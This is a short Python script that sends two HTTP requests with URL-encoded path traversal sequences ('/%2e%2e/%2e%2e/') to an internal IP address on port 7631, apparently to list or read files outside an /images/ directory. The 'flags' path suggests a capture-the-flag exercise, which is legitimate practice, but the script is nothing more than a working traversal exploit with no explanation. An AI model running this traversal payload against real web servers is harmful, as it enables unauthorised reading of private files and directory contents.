import requests

print(requests.get("http://10.51.1.198:7631/images/" + "/%2e%2e/%2e%2e/").text)

print(requests.get("http://10.51.1.198:7631/images/flags" + "/%2e%2e/%2e%2e/%2e%2e/").text)